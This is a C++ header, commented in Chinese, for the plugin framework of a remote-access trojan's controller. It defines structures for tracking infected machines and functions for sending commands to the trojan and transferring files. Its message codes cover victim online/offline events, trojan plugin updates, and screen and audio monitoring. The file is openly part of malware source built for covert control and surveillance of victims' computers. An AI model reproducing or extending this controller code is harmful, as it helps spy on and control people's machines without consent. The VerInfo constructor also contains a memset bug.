// IPlugIn.h: interface for the IPlug class.
//
//
// 客户端插件接口
//////////////////////////////////////////////////////////////////////
#ifndef _IPLUG_H
#define _IPLUG_H

#ifdef LIBPLUG_EXPORT
#define LIBPLUG_API __declspec(dllexport)
#else
#define LIBPLUG_API __declspec(dllimport)
#endif

#include <string>

#define WM_SYSTEMTRAY	(WM_USER+1)
#define WM_TRAY_EXIT	(WM_USER+2)

#define WM_PLUG_FIRST	(WM_USER+100)	//插件的菜单项的最小ID
#define WM_PLUG_LAST	(WM_USER+999)	//插件的菜单项的最大ID
#define WM_PLUG_EACH	10				//每个插件支持的菜单项个数

//////////////////////////////////////////////////////////////////////////
//
// 版本信息的数据结构
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API VerInfo
{
public:
	// 插件名称
	char		sName[MAX_PATH];
	// 插件描述
	char		sDesc[MAX_PATH];
	// 插件作者
	char		sAuthor[MAX_PATH];
	// 插件版本
	UINT		uReserved;
public:
	VerInfo()
	{
		memset(sName,0,sizeof(sName));
		memset(sName,0,sizeof(sDesc));
		memset(sName,0,sizeof(sAuthor));
		uReserved = 0;
	}
};

//标准件数据结构
typedef struct TrojanInfo
{
	void*	s;						//连接会话
	char	guid[40];				//木马GUID
	bool	bOnlineFlag;			//目标机在线标志，true在线
	char	dllInfo[1024];			//插件信息
	int		dllCnt;					//木马插件数目
	char	trojanip[16];			//IP
	unsigned short port;			//木马端口
	unsigned short ostype;			//木马OS类型
	time_t	timestamp;				//上线起始时间
	int		iData;					//树型结构节点值
}STANDARDDATA;

//////////////////////////////////////////////////////////////////////////
//
// 工具条按钮的数据结构
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API ToolBarData
{
public:
	// 名称
	char sName[MAX_PATH];
	// 描述
	TCHAR sDesc[MAX_PATH];
	// 提示
	char sTip[MAX_PATH];
	// ID
	UINT  uId;
	// 图标索引
	UINT  uIconId;
	//是否设置图标组
	BOOL  bGroup;
	ToolBarData(){
		memset(sName,0,sizeof(sName));
		memset(sTip,0,sizeof(sTip));
		memset(sDesc,0,sizeof(sDesc));
		bGroup = FALSE;
		uId = 0;
		uIconId = 0;
	}
};

//////////////////////////////////////////////////////////////////////////
//
// 窗口的停靠位置
// 枚举类型
//
//
//////////////////////////////////////////////////////////////////////////
enum DockPaneDirection
{
	DockLeft,
	DockRight,
	DockTop,
	DockBottom
};

//////////////////////////////////////////////////////////////////////////
//
// 停靠窗口的数据结构
//
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API DockPane
{
public:
	// 窗口名称
	char	sName[MAX_PATH];
	// 窗口句柄
	CWnd*	pWnd;
	// 停靠位置
	DockPaneDirection direct;
	// 窗口大小
	CRect	rect;
	// 窗口图标索引
	UINT	uIconId;
	// 窗口id
	UINT	uId;
	DockPane(){
		memset(sName,0,sizeof(sName));
		pWnd = NULL;
		direct = DockLeft;
		uIconId = 0;
		uId = 0;
		rect.SetRect(0,0,200,150);
	}
};
class SEU_QQwry;
//////////////////////////////////////////////////////////////////////////
//
// 平台的接口
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API ISite
{
public:

	// **************************
	// 增加模板
	static void AddDocTemplate(CMultiDocTemplate*);
	// 得到MainFrame
	static CWnd* GetMainFrameWnd();

	// **************************
	// 创建或激活新窗口
	static CFrameWnd* CreateFrameWnd(CMultiDocTemplate*, CRuntimeClass*, const char*);
	
	// 自动判断是否激活停靠窗口
	static void ShowDockPane(UINT);
	
	// 打开或关闭
	static void ShowDockPane(UINT,BOOL);

	//写日志到输出窗口
	static void WriteLog(const char* fmt, ...);

	// **************************
	// 发送一个服务命令，服务号，参数1，参数2
	static BOOL	Service(UINT,WPARAM,LPARAM);
	// 发送一个消息通知
	static void	Notify(UINT,WPARAM,LPARAM);

	//发送命令给木马服务端
	static int SendCmd(unsigned short cmd, void* s, char* body = NULL, int n = 0);

	//当前选中的木马
	static struct TrojanInfo* GetSelectedTarget();
	
	//设置当前木马
	static void  SetCurrentTarget(const struct TrojanInfo* info);

	//获取IP地址和端口
	static CString GetIPAddrPort(const char* ip, int port); 

	//获取IP的实际物理地址
	static CString GetRealAddr(const struct TrojanInfo* info); 


	//设置状态栏的信息
	//0:上线下线
	//1:当前共有几个用户
	//2:当前选择哪个用户
	//3:网络传输速度
	static void SetStatus(int nIndex, const char* fmt, ...);

	/**以下结构和函数为上传和下载文件显示进度对话框使用**/
	enum{CREATE_DLG, INIT_SRC, INIT_DST, SET_NAME, SET_DIR,SET_SIZE, 
		SET_PROGRESS, SET_SPEED, SET_TIME, DESTROY_DLG};
	
	struct StructProgressNotify
	{
		int id;
		CWnd* dlg;
		UINT_PTR data;
	};

	//给父框架发送消息
	static void OnNotifyProgress(WPARAM,LPARAM);
	//创建进度对话框
	static CWnd* CreateProgressDlg(int isUpOrDown);
	//销毁进度对话框
	static void DestoryDlg(CWnd* dlg);
	//设置源目录
	static void SetSource(CWnd* dlg,const char* src);
	//设置目标目录
	static void SetDestination(CWnd* dlg,const char* dst);
	//设置传送文件
	static void SetTransFile(CWnd* dlg, const char* name);
	//设置传送的子目录
	static void SetSubDir(CWnd* dlg,const char* dir);
	//设置文件大小
	static void SetSize(CWnd* dlg, __int64 nowSize);
	//设置已经传送的文件大小
	static void SetProgress(CWnd* dlg, __int64 totalSize);
	//设置传送速度
	static void SetSpeed(CWnd* dlg, __int64 speed, int isTime = 0);

private:
	static struct TrojanInfo m_current;
	static bool m_bIsQQwryExist;
	static SEU_QQwry* m_QQwry;
	
	friend class PluginApp;
};

//////////////////////////////////////////////////////////////////////////
//
// 平台服务的接口
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API IService
{
public:
	// **************************
	// 插件初始化
	virtual BOOL	OnInitalize() = 0;
	// 卸载插件
	virtual BOOL	OnUninitalize() = 0;
	
	// 接收到一个服务命令，服务号，参数1，参数2
	virtual BOOL	OnService(UINT,WPARAM,LPARAM) = 0;

	// **************************
	// 得到版本信息
	inline VerInfo* GetVerInfo() {return &m_srInfo;}

protected:
	VerInfo m_srInfo;
};

//////////////////////////////////////////////////////////////////////////
//
// 插件接口
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API IPlugIn  
{
public :

	// 插件初始化
	virtual BOOL	OnInitalize() = 0;
	// 卸载插件
	virtual BOOL	OnUninitalize() = 0;
	
	// ************************************
	// 创建文档模板
	virtual void OnCreateDocTemplate() = 0;

	// 创建框架菜单
	virtual void OnCreateFrameMenu(CMenu* pMainMenu) = 0;

	// 创建框架工具条
	virtual	void OnCreateFrameToolBar(ToolBarData*,UINT& count) = 0;

	// 创建停靠窗口
	virtual void OnCreateDockPane(DockPane*, UINT& count) = 0;
	// ************************************

	
	// ************************************
	// 设置最小/大的资源号
	inline	void SetMinResId(UINT min){m_min = min;}
	inline	void SetMaxResId(UINT max){m_max = max;}
	inline	UINT GetMinResId(){return m_min;};
	inline	UINT GetMaxResId(){return m_max;};
	inline	bool IsCurrentWorking(){return curruId == m_min + 2;};
	// ************************************

	// 得到版本信息
	inline VerInfo*	GetVerInfo() {return &m_plugInfo; }
	// ************************************


	// 菜单、工具条操作
	virtual void	OnCommand(UINT resId) = 0;
	virtual void	OnCommandUI(CCmdUI* pCmdUI) = 0;
	// 收到通知，通知号，参数1，参数2
	virtual void	OnNotify(UINT,WPARAM,LPARAM) = 0;

	static int curruId;

protected:
	UINT m_min;
	UINT m_max;
	VerInfo m_plugInfo;
};

//////////////////////////////////////////////////////////////////////////
//
// 服务接口的代理类
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API IServiceProxy  
{
public:
	IServiceProxy(){m_pService = NULL; }
	virtual ~IServiceProxy(){}

	// 获得IService指针
	IService* operator ->(){return m_pService;}
	operator const IService*() const{return m_pService;};

	// 绑定一个接口
	bool Attach(IService* pService)
	{	
		if (pService){ m_pService = pService; return true; }
		return false;
	}
	
	// 分离接口
	IService* Detach()
	{
		IService* pService = m_pService;
		m_pService = NULL;
		return pService;
	}

private:
	IService* m_pService;
};

//////////////////////////////////////////////////////////////////////////
//
// 插件接口的代理类
//
//////////////////////////////////////////////////////////////////////////
class LIBPLUG_API IPlugProxy
{
public:
	IPlugProxy(){m_pPlug = NULL; }
	virtual ~IPlugProxy(){}

	// 绑定一个接口
	bool Attach(IPlugIn* pPlugIn)
	{
		if (pPlugIn)
		{
			m_pPlug = pPlugIn;
			return true;
		}
		return false;
	}
	
	// 分离接口
	IPlugIn* Detach()
	{
		IPlugIn* pPlugIn = m_pPlug;
		m_pPlug = NULL;
		return pPlugIn;
	}
	
	// 获得IPlugIn指针
	IPlugIn* operator->(){return m_pPlug;}
	inline operator const IPlugIn*() const{return m_pPlug;}

	UINT GetFirstIconId(){return m_uIconId;}

	void SetFirstIconId(UINT id){m_uIconId = id;}

	
private:
	IPlugIn*	m_pPlug;
	// imgList图标索引
	UINT	m_uIconId;
};

// 动态连接库包装类，该类主要负责读取dll文件,得到插件,释放dll文件等
class LIBPLUG_API DllWrapper  
{
public:
	DllWrapper();
	virtual ~DllWrapper();

	// 将dll文件中的图片资源放入imageList
	UINT GetImage(CImageList&, UINT id);
	
	// 释放dll文件
	bool FreeLibrary();

	// 导入dll文件
	bool LoadLibrary(const char* path, const char* file);

	// 得到文件的路径
	const char* GetFilePath()const;

	// 得到文件名
	const char*	GetFileName()const;	

	// 得到dll实例
	HINSTANCE	GetInstance()const;
	
	// 得到插件接口
	IPlugProxy&	GetPlugIn();
	
	// 得到平台接口
	IServiceProxy&	GetService();

private:
	// 插件接口
	IPlugProxy	m_plugProxy;
	
	// 平台服务接口
	IServiceProxy	m_serviceProxy;
	
	// 路径
	char			m_strPath[MAX_PATH];
	// 文件名
	char			m_strFile[MAX_PATH];
	// dll句柄
	HINSTANCE		m_hInstance;

};

struct control_header;

//客户端监听线程请求服务的数据
struct DispatchData 
{
	void* s;				//连接会话

	union{
		struct  
		{
			char guid[40];			//木马的GUID
			char trojanip[16];		//木马的IP
			unsigned short port;	//木马的端口
			unsigned short type;	//木马的连接类型
			void* body;				//接受的数据
			control_header* header;
		}recvData;

		struct  
		{
			unsigned short cmd;	//命令字
			void* body;			//发送的数据
			int dataLen;		//数据长度
		}sendData;

	};

	 int (*readFunction)(void* s, char* buf, int dataLen, int isCompressed, int bufLen, int flags);	//网络读取函数
	 int (*WriteFunction)(void* s, char* header, char* buf, int dataLen, int isCompressed);//网络写函数
};

//*****************************通信宏***************************/
//
#define		ZCM_BASE				20001

//用户选择一个目标机,
//参数wp:pSTANDARDDATA结构指针
#define		ZCM_SEL_OBJ				ZCM_BASE+0x01

//其他插件向标准件请求得到目标机信息
//参数wp:conn s会话连接 返回LP STANDARDDATA结构数据
#define		ZCM_GET_OBJ				ZCM_BASE+0x02

//其他插件向标准件请求发送数据指令给木马
#define		ZCM_SEND_MSG			ZCM_BASE+0x03

//标准件通知其他插件木马端接收到数据
#define		ZCM_RECV_MSG			ZCM_BASE+0x04

//通知标准插件更新木马插件
#define		ZCM_UPDATE_TROJAN		ZCM_BASE+0x05

//其他插件向取主机属性插件得到目标机磁盘信息
#define     ZCM_GET_SYSINFO         ZCM_BASE+0x08

//收到keepalive发广播消息
#define		ZCM_NEW_ONLINE		ZCM_BASE+0x09

//目标机离线发广播消息
#define		ZCM_WM_OFFLINE			ZCM_BASE+0x0A

//接受文件传送的消息
#define		ZCM_WM_UPLOAD_DOWNLOAD	ZCM_BASE+0x0B

//手机上线通知
#define		ZCM_WM_MSG_ONLINE		ZCM_BASE+0x0C

//标准件右键菜单服务
#define		ZCM_WM_R_MENU			ZCM_BASE+0x0D

//标准件写日志服务
#define		ZCM_WM_WRITE_LOG		ZCM_BASE+0x0E

//其它插件向配置信息插件请求目标机描述
#define     ZCM_WM_DESCRIPTION      ZCM_BASE+0x0F

//标准件提供的服务,向其他插件提供本地ip和监听端口
#define		ZCM_WM_LOCAL_NET		ZCM_BASE+0x10

//向其他插件发送目标机描述，描述内容char lp[MAX_PATH]
#define		ZCM_WM_SEND_DES			ZCM_BASE+0x11

#define		ZCM_DB_SQL				ZCM_BASE+0x12
#define		ZCM_DB_INSERT			ZCM_BASE+0x13
#define		ZCM_DB_UPDATE			ZCM_BASE+0x14
#define		ZCM_DB_DELETE			ZCM_BASE+0x15

#define		ZCM_DB_GET_POOL			ZCM_BASE+0x16

#define		ZCM_PROGRESS			ZCM_BASE+0x17

//接受屏幕监控处理
#define		ZCM_WM_SCREEN			ZCM_BASE+0x18

//接受声音监控处理
#define		ZCM_WM_AUDIO			ZCM_BASE+0x19
#endif 